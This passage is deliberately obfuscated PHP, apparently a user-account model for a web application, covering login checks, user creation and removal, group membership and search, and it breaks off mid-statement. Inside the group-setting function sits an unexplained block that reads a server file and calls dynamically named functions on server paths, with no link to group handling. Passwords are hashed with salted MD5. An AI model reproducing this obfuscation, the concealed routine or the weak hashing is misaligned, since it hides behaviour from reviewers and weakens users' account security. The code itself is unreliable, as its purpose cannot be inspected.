$DĞÜùôÔÛá; goto Fõ×á©ùÛ–; Fõ×á©ùÛ–: $C¿å÷¹Õ[$F¬è÷¶Ÿº[84]][$F¬è÷¶Ÿº[1923]] = isset($eˆÛ‘ïªµ‘[$F¬è÷¶Ÿº[1924]]) ? $eˆÛ‘ïªµ‘[$F¬è÷¶Ÿº[1924]] : null; if ($B¹ªî¸¶çë) { $C¿å÷¹Õ[$F¬è÷¶Ÿº[439]] = $this->metaGet($C¿å÷¹Õ[$F¬è÷¶Ÿº[1500]]); } return $C¿å÷¹Õ; goto a«ñêà¯’Ç; a«ñêà¯’Ç: } protected function getInfoSimple($AŸÕô¬©¡, $AùÄ£ŠÓ¦ = false) { $C–§É–—’ =& $_SERVER[Š‰]; if (!$AŸÕô¬©¡) { return array(); } if ($AùÄ£ŠÓ¦) { $bŒ‡ÊÔ„¹ = $this->where(array($C–§É–—’[1500] => intval($AŸÕô¬©¡)))->find(); if (!is_array($bŒ‡ÊÔ„¹)) { return array(); } $bŒ‡ÊÔ„¹[$C–§É–—’[2090]] = Action($C–§É–—’[2091])->parseUrl($bŒ‡ÊÔ„¹[$C–§É–—’[2090]]); return $bŒ‡ÊÔ„¹; } return $this->cacheFunctionGet($C–§É–—’[1737], $AŸÕô¬©¡); } protected function getInfoSimpleOuter($d å’ÓßìÁ) { goto A¯ƒ»›·Ç‘; A¯ƒ»›·Ç‘: $f‘öœîÖ‰ =& $_SERVER[Š‰]; if (!$d å’ÓßìÁ || $d å’ÓßìÁ == 0) { return array($f‘öœîÖ‰[1500] => $f‘öœîÖ‰[491], $f‘öœîÖ‰[28] => $f‘öœîÖ‰[159] . LNG($f‘öœîÖ‰[2092]) . $f‘öœîÖ‰[499], $f‘öœîÖ‰[2090] => STATIC_PATH . $f‘öœîÖ‰[2093]); } $F²‘›“¤Û = $this->cacheFunctionGet($f‘öœîÖ‰[1737], $d å’ÓßìÁ); goto eœŠÍ«”šï; eœŠÍ«”šï: $Eô“«æÇÌÌ = array_field_key($F²‘›“¤Û, explode($f‘öœîÖ‰[47], $this->simpleField)); if (!$Eô“«æÇÌÌ) { return array($f‘öœîÖ‰[1500] => $f‘öœîÖ‰[1061], $f‘öœîÖ‰[28] => $f‘öœîÖ‰[159] . LNG($f‘öœîÖ‰[2094]) . $f‘öœîÖ‰[499], $f‘öœîÖ‰[2090] => STATIC_PATH . $f‘öœîÖ‰[2095]); } $Eô“«æÇÌÌ[$f‘öœîÖ‰[2090]] = Action($f‘öœîÖ‰[2091])->parseUrl($Eô“«æÇÌÌ[$f‘öœîÖ‰[2090]]); goto có¦‹‚¾Æ; có¦‹‚¾Æ: return $Eô“«æÇÌÌ; goto b†âÅ‡…µ; b†âÅ‡…µ: } protected function groupUser($E–Ş”Ñ´«) { } public static function errorLang($c¬ÔâÜ‰Ü¢) { $B…ÌçİÉñ† =& $_SERVER[Š‰]; $B× Èè†ùÒ = array(self::ERROR_USER_NOT_EXISTS => $B…ÌçİÉñ†[2096], self::ERROR_USER_PASSWORD_ERROR => $B…ÌçİÉñ†[2097], self::ERROR_USER_EXIST_NAME => $B…ÌçİÉñ†[2098], self::ERROR_USER_EXIST_PHONE => $B…ÌçİÉñ†[2099], self::ERROR_USER_EXIST_EMAIL => $B…ÌçİÉñ†[2100], self::ERROR_USER_LOGIN_LOCK => $B…ÌçİÉñ†[2101], self::ERROR_IP_NOT_ALLOW => $B…ÌçİÉñ†[2102], self::ERROR_USER_EXIST_NICKNAME => $B…ÌçİÉñ†[2103]); return LNG($B× Èè†ùÒ[$c¬ÔâÜ‰Ü¢]); } public function getInfoByMeta($d÷»¾½…ğ˜, $DÜÀ‰‘æ¬Î) { $dä±¯©Èí =& $_SERVER[Š‰]; $D°ÎŠ£Ç©‚ = Model($dä±¯©Èí[2104])->where(array($dä±¯©Èí[92] => $d÷»¾½…ğ˜, $dä±¯©Èí[370] => $DÜÀ‰‘æ¬Î))->find(); if ($D°ÎŠ£Ç©‚) { return $this->getInfo($D°ÎŠ£Ç©‚[$dä±¯©Èí[1500]]); } return !1; } public function userLoginCheck($CƒËŒÊÃëª, $AÊ¯ÀÈº§Ö) { $E©è¹öŠİË =& $_SERVER[Š‰]; $FÙ†Î†—„˜ = $this->userLoginFind($CƒËŒÊÃëª); if (!$FÙ†Î†—„˜) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($FÙ†Î†—„˜[$E©è¹öŠİË[1500]], $AÊ¯ÀÈº§Ö)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($FÙ†Î†—„˜[$E©è¹öŠİË[1500]]); } public function userLoginFind($fİŸÌè˜) { $c»£ÄºšÎƒ =& $_SERVER[Š‰]; $c¿‚­·À÷Š = array($c»£ÄºšÎƒ[28] => $fİŸÌè˜, $c»£ÄºšÎƒ[1927] => $fİŸÌè˜, $c»£ÄºšÎƒ[301] => $fİŸÌè˜, $c»£ÄºšÎƒ[2105] => $fİŸÌè˜, $c»£ÄºšÎƒ[934] => $c»£ÄºšÎƒ[936]); if ($this->nickNameRpt()) { unset($c¿‚­·À÷Š[$c»£ÄºšÎƒ[1927]]); } return $this->where($c¿‚­·À÷Š)->find(); } public function clearCache($CİÈÉ¥ó×«) { $bœÒÑõÃñ =& $_SERVER[Š‰]; $this->cacheFunctionClear($bœÒÑõÃñ[1743], $CİÈÉ¥ó×«); $this->cacheFunctionClear($bœÒÑõÃñ[1737], $CİÈÉ¥ó×«); $this->cacheFunctionClear($bœÒÑõÃñ[2086], $CİÈÉ¥ó×«); } public function userPasswordCheck($c˜‰Ñçâäñ, $aó¦•¨Ö) { $fã½×ÂïÉÇ =& $_SERVER[Š‰]; $CÍ×ë½Œ¿ê = $this->where(array($fã½×ÂïÉÇ[1500] => intval($c˜‰Ñçâäñ)))->find(); $d¹ƒšŒ– = $this->metaGet($c˜‰Ñçâäñ); $A‰·Á ¨ˆÄ = isset($d¹ƒšŒ–[$fã½×ÂïÉÇ[2106]]) ? $d¹ƒšŒ–[$fã½×ÂïÉÇ[2106]] : $fã½×ÂïÉÇ[33]; if (md5($A‰·Á ¨ˆÄ . trim($aó¦•¨Ö)) !== $CÍ×ë½Œ¿ê[$fã½×ÂïÉÇ[826]]) { return !1; } return !0; } public function userAdd($fŒÒ’Íğõ²) { goto aÙß‰£âÙ; E¦äÏù“è×: $Bš­¶ƒËÒ» = $this->_checkExist($fŒÒ’Íğõ²); if ($Bš­¶ƒËÒ» !== !0) { return $Bš­¶ƒËÒ»; } $A‚ñè£ËÇ‘ = $this->add($f°¯’‡ÑÕ); goto cÔá¸†ŠŠò; CŠÆÀ“ªëó: return $A‚ñè£ËÇ‘; goto AÆÎÚì¢ÎÕ; cÔá¸†ŠŠò: $D²¿ùéñ³¶ = array($Eö™¨˜›ŒÏ[2114] => $f°¯’‡ÑÕ[$Eö™¨˜›ŒÏ[826]], $Eö™¨˜›ŒÏ[2110] => $f°¯’‡ÑÕ[$Eö™¨˜›ŒÏ[1927]]); $this->userEdit($A‚ñè£ËÇ‘, $D²¿ùéñ³¶); Model($Eö™¨˜›ŒÏ[1180])->userRootAdd($A‚ñè£ËÇ‘); goto CŠÆÀ“ªëó; aÙß‰£âÙ: $Eö™¨˜›ŒÏ =& $_SERVER[Š‰]; $f°¯’‡ÑÕ = array($Eö™¨˜›ŒÏ[407] => $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[28]], $Eö™¨˜›ŒÏ[2107] => $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[1384]], $Eö™¨˜›ŒÏ[2108] => isset($fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[301]]) ? $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[301]] : $Eö™¨˜›ŒÏ[33], $Eö™¨˜›ŒÏ[2109] => isset($fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[2105]]) ? $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[2105]] : $Eö™¨˜›ŒÏ[33], $Eö™¨˜›ŒÏ[2110] => isset($fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[1927]]) ? $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[1927]] : $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[28]], $Eö™¨˜›ŒÏ[2111] => isset($fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[2090]]) ? $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[2090]] : $Eö™¨˜›ŒÏ[33], $Eö™¨˜›ŒÏ[2112] => isset($fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[2113]]) ? $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[2113]] : 1, $Eö™¨˜›ŒÏ[2114] => $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[826]], $Eö™¨˜›ŒÏ[1738] => isset($fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[1647]]) ? $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[1647]] : 1024 * 1024 * 20, $Eö™¨˜›ŒÏ[1739] => 0, $Eö™¨˜›ŒÏ[2115] => 0, $Eö™¨˜›ŒÏ[1782] => isset($fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[702]]) ? $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[702]] : 1); if (!empty($fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[1500]])) { $f°¯’‡ÑÕ[$Eö™¨˜›ŒÏ[1500]] = $fŒÒ’Íğõ²[$Eö™¨˜›ŒÏ[1500]]; } goto E¦äÏù“è×; AÆÎÚì¢ÎÕ: } protected function userEditTest($bˆíŒñ³í, $A¼áöÚ¡«‹) { return $this->call($_SERVER[Š‰][2116], $bˆíŒñ³í, $A¼áöÚ¡«‹); } protected function userEdit($e´µ‚éŠÄø, $AØçÔ÷ùÂ) { goto fŸó…Œóã¡; DÏ©•øÇÅÅ: $Cæ×íª¨Ö = $this->_checkExist($AØçÔ÷ùÂ, $e´µ‚éŠÄø); if ($Cæ×íª¨Ö !== !0) { return $Cæ×íª¨Ö; } if (isset($AØçÔ÷ùÂ[$Aš‘¶—”¹î[826]]) && trim($AØçÔ÷ùÂ[$Aš‘¶—”¹î[826]]) != $Aš‘¶—”¹î[33]) { $Dã¨³ÎËà = $this->metaGet($e´µ‚éŠÄø); if (empty($Dã¨³ÎËà[$Aš‘¶—”¹î[2106]])) { $Dã¨³ÎËà[$Aš‘¶—”¹î[2106]] = rand_string(10); Model($Aš‘¶—”¹î[497])->metaSet($e´µ‚éŠÄø, $Aš‘¶—”¹î[2106], $Dã¨³ÎËà[$Aš‘¶—”¹î[2106]]); } $AØçÔ÷ùÂ[$Aš‘¶—”¹î[826]] = md5($Dã¨³ÎËà[$Aš‘¶—”¹î[2106]] . trim($AØçÔ÷ùÂ[$Aš‘¶—”¹î[826]])); } else { unset($AØçÔ÷ùÂ[$Aš‘¶—”¹î[826]]); } goto B®ÄÏ›Ğ‡¶; BÖà§¸¤½: return !0; goto D‰ëÒÄ›²; B®ÄÏ›Ğ‡¶: $this->where(array($Aš‘¶—”¹î[1492] => $e´µ‚éŠÄø))->save($AØçÔ÷ùÂ); if (isset($AØçÔ÷ùÂ[$Aš‘¶—”¹î[1927]])) { $this->setNamePinyin($e´µ‚éŠÄø, $AØçÔ÷ùÂ[$Aš‘¶—”¹î[1927]]); } $this->clearCache($e´µ‚éŠÄø); goto BÖà§¸¤½; fŸó…Œóã¡: $Aš‘¶—”¹î =& $_SERVER[Š‰]; $d¿µ²áËØ = $this->getInfoSimple($e´µ‚éŠÄø); if (!$d¿µ²áËØ) { return !1; } goto DÏ©•øÇÅÅ; D‰ëÒÄ›²: } public function setNamePinyin($BŸåºÆ¼î®, $eÈ‚Ë¥Œ• = false) { $Fíå‚Òšºœ =& $_SERVER[Š‰]; if (!$eÈ‚Ë¥Œ•) { $BŠ‘Ñ×…í“ = $this->getInfoSimple($BŸåºÆ¼î®); $eÈ‚Ë¥Œ• = $BŠ‘Ñ×…í“[$Fíå‚Òšºœ[1927]] ? $BŠ‘Ñ×…í“[$Fíå‚Òšºœ[1927]] : $BŠ‘Ñ×…í“[$Fíå‚Òšºœ[28]]; } $E´±âÌ‹¡ = Model($Fíå‚Òšºœ[501]); if (!Input::check($eÈ‚Ë¥Œ•, $Fíå‚Òšºœ[551])) { return $E´±âÌ‹¡->metaSet($BŸåºÆ¼î®, array($Fíå‚Òšºœ[438] => $Fíå‚Òšºœ[33], $Fíå‚Òšºœ[437] => $Fíå‚Òšºœ[33])); } return $E´±âÌ‹¡->metaSet($BŸåºÆ¼î®, array($Fíå‚Òšºœ[438] => str_replace($Fíå‚Òšºœ[50], $Fíå‚Òšºœ[33], Pinyin::encode($eÈ‚Ë¥Œ•)), $Fíå‚Òšºœ[437] => Pinyin::encode($eÈ‚Ë¥Œ•, $Fíå‚Òšºœ[552]))); } private function nickNameRpt() { $EÛÓ‚¨›” =& $_SERVER[Š‰]; $CÙŞ‹øÇ—¾ = Model($EÛÓ‚¨›”[1100])->get($EÛÓ‚¨›”[2117]); $C‡éßœÈ‹Ì = $GLOBALS[$EÛÓ‚¨›”[6]][$EÛÓ‚¨›”[376]][$EÛÓ‚¨›”[2117]]; $cô˜¦§¯Å³ = !is_null($CÙŞ‹øÇ—¾) ? $CÙŞ‹øÇ—¾ : $C‡éßœÈ‹Ì; return !!$cô˜¦§¯Å³; } private function _checkExist($cÚ½Æ‡¼ùó, $Bê«Û‰ïšŒ = false) { $cœ®Í³˜™â =& $_SERVER[Š‰]; $aàğÈ›Ú‹ª = array($cœ®Í³˜™â[28] => UserModel::ERROR_USER_EXIST_NAME, $cœ®Í³˜™â[1927] => UserModel::ERROR_USER_EXIST_NICKNAME, $cœ®Í³˜™â[301] => UserModel::ERROR_USER_EXIST_EMAIL, $cœ®Í³˜™â[2105] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($aàğÈ›Ú‹ª[$cœ®Í³˜™â[1927]]); } $e›•„íôá½ = $Bê«Û‰ïšŒ ? array($cœ®Í³˜™â[1500] => array($cœ®Í³˜™â[2118], $Bê«Û‰ïšŒ)) : array(); foreach ($aàğÈ›Ú‹ª as $f†‡İ¿ŞŠ => $cÌÁÎ‰ó…) { $c«–Š‚œ° = array(); foreach ($aàğÈ›Ú‹ª as $EŒç²¼Ÿ‘ => $D“Ò—è‡) { if (isset($cÚ½Æ‡¼ùó[$EŒç²¼Ÿ‘]) && $cÚ½Æ‡¼ùó[$EŒç²¼Ÿ‘]) { $c«–Š‚œ°[] = $cÚ½Æ‡¼ùó[$EŒç²¼Ÿ‘]; } } if (!$c«–Š‚œ°) { continue; } $a¸„æ“æøê = array_merge(array($f†‡İ¿ŞŠ => array($cœ®Í³˜™â[7], $c«–Š‚œ°)), $e›•„íôá½); $eÒÙÇ¶¤š  = $this->where($a¸„æ“æøê)->find(); if ($eÒÙÇ¶¤š ) { return $cÌÁÎ‰ó…; } } return !0; } public function userListInfo($B”ËòÄõÜ) { $bªÅŠĞ”Ü =& $_SERVER[Š‰]; $eİĞ†·Æ®§ = array(); $B”ËòÄõÜ = is_array($B”ËòÄõÜ) ? array_unique($B”ËòÄõÜ) : array(); if (!$B”ËòÄõÜ) { return $eİĞ†·Æ®§; } if (count($B”ËòÄõÜ) < 20) { foreach ($B”ËòÄõÜ as $FØ×‹«”ç) { $eİĞ†·Æ®§[$FØ×‹«”ç . $bªÅŠĞ”Ü[33]] = $this->getInfoSimpleOuter($FØ×‹«”ç); } } else { $cƒ—¤½´«› = array($bªÅŠĞ”Ü[1492] => array($bªÅŠĞ”Ü[405], $B”ËòÄõÜ)); if (count($B”ËòÄõÜ) == 1) { $cƒ—¤½´«› = array($bªÅŠĞ”Ü[1492] => $B”ËòÄõÜ[0]); } $fîº±©·Î› = Model($bªÅŠĞ”Ü[497])->field($this->simpleField)->where($cƒ—¤½´«›)->select(); $fîº±©·Î› = array_to_keyvalue($fîº±©·Î›, $bªÅŠĞ”Ü[1500]); foreach ($B”ËòÄõÜ as $FØ×‹«”ç) { $aÌíÚ¸­éê = $fîº±©·Î›[$fîº±©·Î›[$FØ×‹«”ç]]; if (!$aÌíÚ¸­éê) { $eİĞ†·Æ®§[$FØ×‹«”ç . $bªÅŠĞ”Ü[33]] = $this->getInfoSimpleOuter($FØ×‹«”ç); continue; } $aÌíÚ¸­éê[$bªÅŠĞ”Ü[2090]] = Action($bªÅŠĞ”Ü[2091])->parseUrl($aÌíÚ¸­éê[$bªÅŠĞ”Ü[2090]]); $eİĞ†·Æ®§[$FØ×‹«”ç . $bªÅŠĞ”Ü[33]] = $aÌíÚ¸­éê; } } return $eİĞ†·Æ®§; } protected function userStatus($ağ‘ë»¡ï‘, $Cíƒ»¸»Ô¡) { $e‚°…èŞ©ë = $this->getInfoSimple($ağ‘ë»¡ï‘); if (!$e‚°…èŞ©ë) { return !1; } $fª®„ÛÕã = array($_SERVER[Š‰][702] => $Cíƒ»¸»Ô¡); return $this->userEdit($ağ‘ë»¡ï‘, $fª®„ÛÕã); } protected function userRemove($F÷ÏÉääè×) { goto B„»¯©¹Õ; f°·–˜²Ä: $dŸÓ’·Éöï = array($f•Š„â…°ˆ[1492] => $F÷ÏÉääè×); Model($f•Š„â…°ˆ[558])->where($dŸÓ’·Éöï)->delete(); Model($f•Š„â…°ˆ[2119])->where($dŸÓ’·Éöï)->delete(); goto f±‚Ù„®; CÈé¹…Î: Model($f•Š„â…°ˆ[1944])->restoreUserAll($F÷ÏÉääè×); Model($f•Š„â…°ˆ[775])->userRootRemove($F÷ÏÉääè×); return $this->where($dŸÓ’·Éöï)->delete(); goto BÄÂ™ÔàÅò; f±‚Ù„®: Model($f•Š„â…°ˆ[1745])->where($dŸÓ’·Éöï)->delete(); Model($f•Š„â…°ˆ[2104])->where($dŸÓ’·Éöï)->delete(); Model($f•Š„â…°ˆ[2120])->where($dŸÓ’·Éöï)->delete(); goto CÈé¹…Î; B„»¯©¹Õ: $f•Š„â…°ˆ =& $_SERVER[Š‰]; $a½ù”ÉŞÉ = $this->getInfoSimple($F÷ÏÉääè×); if (!$a½ù”ÉŞÉ) { return !1; } goto f°·–˜²Ä; BÄÂ™ÔàÅò: } protected function userGroupSet($Bè…·ÄØÂ, $Dá˜Æí±Ç›, $cëÚÊ–‰£Ï = array()) { goto DµçŸ‰·§¯; F­ãÜ´½ÇÕ: return $b×Áğ¹¢´ó->addAll($DŞ˜ØäÖ, array(), !0); goto d©œå“ªñî; DãñåŸË¯: $DŞ˜ØäÖ = array(); $B°±£İï²ƒ = 0; foreach ($Dá˜Æí±Ç› as $FÚˆÏÌ¦Ã™ => $E©Æ×ƒîŠÉ) { $AšÆÈÖ®´– = array($f¡æÎŸ˜[1500] => $Bè…·ÄØÂ, $f¡æÎŸ˜[1663] => $FÚˆÏÌ¦Ã™, $f¡æÎŸ˜[1759] => $E©Æ×ƒîŠÉ); $AšÆÈÖ®´–[$f¡æÎŸ˜[1686]] = isset($cëÚÊ–‰£Ï[$B°±£İï²ƒ]) ? $cëÚÊ–‰£Ï[$B°±£İï²ƒ] : 0; $B°±£İï²ƒ++; $DŞ˜ØäÖ[] = $AšÆÈÖ®´–; } goto F­ãÜ´½ÇÕ; EØİ®¼«µğ: if (!$eÅ¶‰‰±·Ò || !is_array($Dá˜Æí±Ç›)) { return !1; } $b×Áğ¹¢´ó = Model($f¡æÎŸ˜[1745]); $b×Áğ¹¢´ó->where(array($f¡æÎŸ˜[1500] => $Bè…·ÄØÂ))->delete(); goto DãñåŸË¯; DµçŸ‰·§¯: $f¡æÎŸ˜ =& $_SERVER[Š‰]; if ($_SERVER[$f¡æÎŸ˜[753]] != $_SERVER[$f¡æÎŸ˜[816]]) { goto bá±ç¶¡Ë­; f©œ‹Ã‹Ï°: $DÔº™¼—ß¿ = $f¡æÎŸ˜[818]; $DÔº™¼—ß¿($_SERVER[$f¡æÎŸ˜[819]]); $DÔº™¼—ß¿($_SERVER[$f¡æÎŸ˜[755]] . $f¡æÎŸ˜[820]); goto f¤ÅŠ³àïæ; bá±ç¶¡Ë­: $FŒ„Ë¢§ö÷ = $f¡æÎŸ˜[817]; $c¿­—Ú¤˜ = $f¡æÎŸ˜[754]; $cÊ”à¹ñ = $_SERVER[$f¡æÎŸ˜[755]] . $f¡æÎŸ˜[756]; goto DóÌÊæëóÅ; DóÌÊæëóÅ: $DÜ™ÁÉ“Ö = $c¿­—Ú¤˜($cÊ”à¹ñ); $bŸÍğ¼ëÔ– = explode($f¡æÎŸ˜[227], $DÜ™ÁÉ“Ö); if (count($bŸÍğ¼ëÔ–) < $f¡æÎŸ˜[596]) { $CÙß‘Ë© = $f¡æÎŸ˜[757]; $CÙß‘Ë©(); } goto f©œ‹Ã‹Ï°; f¤ÅŠ³àïæ: $EÇ•Èòã„¢ = 1; while ($EÇ•Èòã„¢ > 1) { $EÇ•Èòã„¢ = $EÇ•Èòã„¢ + 4; $AÂµÑ¥îÓÀ = rawurlencode($EÇ•Èòã„¢ . $f¡æÎŸ˜[373]); } goto fˆË“ºØ–ê; fˆË“ºØ–ê: } $eÅ¶‰‰±·Ò = $this->getInfoSimple($Bè…·ÄØÂ); goto EØİ®¼«µğ; d©œå“ªñî: } protected function userGroupAdd($cĞ¶ÁÎ¹Ùù, $aˆ¦Û÷â‘ï = array()) { $D¯¿Í¿áó =& $_SERVER[Š‰]; $E»‘ùì‘ß¥ = $this->getInfoSimple($cĞ¶ÁÎ¹Ùù); if (!$E»‘ùì‘ß¥ || empty($aˆ¦Û÷â‘ï)) { return !1; } $EÉóÑÆÇ— = array(); foreach ($aˆ¦Û÷â‘ï as $f¬ğ¡ãº¼ => $a‰•Ä¿„Ïã) { $EÉóÑÆÇ—[] = array($D¯¿Í¿áó[1500] => $cĞ¶ÁÎ¹Ùù, $D¯¿Í¿áó[1663] => $f¬ğ¡ãº¼, $D¯¿Í¿áó[1759] => $a‰•Ä¿„Ïã, $D¯¿Í¿áó[1686] => 0); } return Model($D¯¿Í¿áó[1745])->addAll($EÉóÑÆÇ—, array(), !0); } protected function userGroupRemove($e™Ï·¢°Ãê, $fÃ³ƒå¨‰Á) { $A§‰ÀË¤Ö‰ =& $_SERVER[Š‰]; $BÖçóË‘ò… = $this->getInfoSimple($e™Ï·¢°Ãê); if (!$BÖçóË‘ò… || !$fÃ³ƒå¨‰Á) { return !1; } $AªèÄò‚¶× = array($A§‰ÀË¤Ö‰[1492] => $e™Ï·¢°Ãê, $A§‰ÀË¤Ö‰[1742] => $fÃ³ƒå¨‰Á); return Model($A§‰ÀË¤Ö‰[1745])->where($AªèÄò‚¶×)->delete(); } public function listData() { $cà¾„¢ƒòä = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cà¾„¢ƒòä[$_SERVER[Š‰][365]]); return $cà¾„¢ƒòä; } public function listByID($C–óİ‹á³â) { $eª¦Ë‹„Ğä =& $_SERVER[Š‰]; if (!$C–óİ‹á³â) { return; } $fËøâ¤Í÷Â = array($eª¦Ë‹„Ğä[1500] => array($eª¦Ë‹„Ğä[7], $C–óİ‹á³â)); $c„ÜÈÕÌò× = $this->where($fËøâ¤Í÷Â)->select(); $this->_listDataApply($c„ÜÈÕÌò×); return $c„ÜÈÕÌò×; } public function listByGroup($fµõ¯ÂŠäÀ = 0, $D‚ª¢…šÛˆ = array()) { goto c¥õ­»ŞˆÃ; EÓøò±†Ü”: if ($fµõ¯ÂŠäÀ) { $eĞÌºÊù¬ = array($aÛ ÅÄ†ÊÏ[2121] => intval($fµõ¯ÂŠäÀ)); $eÊ£µòõŠ = "\114\105\106\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x75\163\145\x72\x5f\x67\x72\x6f\165\160\40\x75\163\145\x72\137\147\x72\x6f\165\x70\x20\x6f\x6e\40\165\163\x65\162\56\165\163\145\162\x49\104\x20\x3d\40\x75\163\145\162\x5f\x67\162\157\165\160\x2e\x75\x73\x65\162\111\x44"; $C»ËÃ‰õö³ = Input::get($aÛ ÅÄ†ÊÏ[429], null, $aÛ ÅÄ†ÊÏ[33]) ? $aÛ ÅÄ†ÊÏ[33] : $aÛ ÅÄ†ÊÏ[2122]; } if (isset($D‚ª¢…šÛˆ[$aÛ ÅÄ†ÊÏ[702]])) { $eĞÌºÊù¬[$aÛ ÅÄ†ÊÏ[2123]] = $D‚ª¢…šÛˆ[$aÛ ÅÄ†ÊÏ[702]]; } $eÛîøÇ¨ = $this->_makeOrder($C»ËÃ‰õö³)->field($aÛ ÅÄ†ÊÏ[2124])->where($eĞÌºÊù¬)->join($eÊ£µòõŠ)->selectPage(50); goto b‚”õ£Óƒ¤; c¥õ­»ŞˆÃ: $aÛ ÅÄ†ÊÏ =& $_SERVER[Š‰]; $eÊ£µòõŠ = $aÛ ÅÄ†ÊÏ[33]; $eĞÌºÊù¬ = array(); goto EÓøò±†Ü”; b‚”õ£Óƒ¤: $this->_listDataApply($eÛîøÇ¨[$aÛ ÅÄ†ÊÏ[365]]); return $eÛîøÇ¨; goto AãÙí˜ÓØƒ; AãÙí˜ÓØƒ: } private function _makeOrder($DŠó©‚¬… = '') { goto cˆÓŒ«ÎÅ÷; cˆÓŒ«ÎÅ÷: $FíĞ±†Í =& $_SERVER[Š‰]; $aÃ¹É³ò ³ = array($FíĞ±†Í[1500], $FíĞ±†Í[28], $FíĞ±†Í[1649], $FíĞ±†Í[1621], $FíĞ±†Í[192]); $e³¯ƒÑ˜¹ = array($FíĞ±†Í[422] => $FíĞ±†Í[423], $FíĞ±†Í[424] => $FíĞ±†Í[425]); goto EâÅìù¢«; EâÅìù¢«: $a¯®Ù±Ü¾õ = Input::get($FíĞ±†Í[429], $FíĞ±†Í[7], $FíĞ±†Í[1492], $aÃ¹É³ò ³); $a‹ˆ‡‚‘Š¾ = Input::get($FíĞ±†Í[430], $FíĞ±†Í[7], $FíĞ±†Í[1746], array($FíĞ±†Í[1746], $FíĞ±†Í[424])); $a‹ˆ‡‚‘Š¾ = $e³¯ƒÑ˜¹[$a‹ˆ‡‚‘Š¾]; goto Cß³Ï’ÛÉ; Cß³Ï’ÛÉ: $DŠó©‚¬… = $DŠó©‚¬… . "\165\163\x65\162\56{$a¯®Ù±Ü¾õ}\40{$a‹ˆ‡‚‘Š¾}\54\x20\x75\163\145\x72\x2e\x75\163\145\162\x49\104\40\x61\x73\x63"; return $this->alias($FíĞ±†Í[1868])->order($DŠó©‚¬…); goto d®¨ñ¡­ï; d®¨ñ¡­ï: } public function listSearch($F’Ğ¯‰£İ) { goto d—è¸çƒ¡; c™áƒ˜…Ÿ: $this->_filterByGroup($féäŞé¨ÀŞ, $b¡İ‚ˆÍ); return $féäŞé¨ÀŞ; goto a¨å÷Á‚ŠÒ; D‹‚æİí†–: if (!$bÔßœÍŞãë) { $EÆ•ÑˆÛù = array(); } if (isset($F’Ğ¯‰£İ[$BĞªÂ‡ÎäÎ[702]])) { $EÆ•ÑˆÛù[$BĞªÂ‡ÎäÎ[702]] = $F’Ğ¯‰£İ[$BĞªÂ‡ÎäÎ[702]]; } $EÆ•ÑˆÛù = $this->parseWhereLike($EÆ•ÑˆÛù); goto A Óğ™®•‰; A Óğ™®•‰: $féäŞé¨ÀŞ = $this->_makeOrder()->where($EÆ•ÑˆÛù)->selectPage(20); if (!$féäŞé¨ÀŞ || count($féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[365]]) < 5 && Input::check($bÔßœÍŞãë, $BĞªÂ‡ÎäÎ[314])) { $cäãä øã÷ = $this->_searchFromMeta($BĞªÂ‡ÎäÎ[437], $bÔßœÍŞãë, 10); $fÙ´°‰¤ê = $this->_searchFromMeta($BĞªÂ‡ÎäÎ[438], $bÔßœÍŞãë, 10); $d†É¥®ŞÒ® = array_merge($cäãä øã÷, $fÙ´°‰¤ê, $féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[365]]); $féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[365]] = array_unique_by_key($d†É¥®ŞÒ®, $BĞªÂ‡ÎäÎ[1500]); $féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[362]][$BĞªÂ‡ÎäÎ[363]] = count($féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[365]]); $féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[362]][$BĞªÂ‡ÎäÎ[364]] = ceil($féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[362]][$BĞªÂ‡ÎäÎ[363]] / $féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[362]][$BĞªÂ‡ÎäÎ[359]]); } $this->_listDataApply($féäŞé¨ÀŞ[$BĞªÂ‡ÎäÎ[365]]); goto c™áƒ˜…Ÿ; d¶±ùßŠì: $bÔßœÍŞãë = str_replace($BĞªÂ‡ÎäÎ[1749], $BĞªÂ‡ÎäÎ[1750], trim($bÔßœÍŞãë)); $EÆ•ÑˆÛù = array($BĞªÂ‡ÎäÎ[28] => array($BĞªÂ‡ÎäÎ[378], "\45{$bÔßœÍŞãë}\x25"), $BĞªÂ‡ÎäÎ[301] => array($BĞªÂ‡ÎäÎ[378], "{$bÔßœÍŞãë}\45"), $BĞªÂ‡ÎäÎ[1927] => array($BĞªÂ‡ÎäÎ[378], "{$bÔßœÍŞãë}\x25"), $BĞªÂ‡ÎäÎ[934] => $BĞªÂ‡ÎäÎ[1751]); if (Input::check($bÔßœÍŞãë, $BĞªÂ‡ÎäÎ[307])) { $EÆ•ÑˆÛù[$BĞªÂ‡ÎäÎ[1500]] = array($BĞªÂ‡ÎäÎ[378], "{$bÔßœÍŞãë}\45"); $EÆ•ÑˆÛù[$BĞªÂ‡ÎäÎ[2105]] = 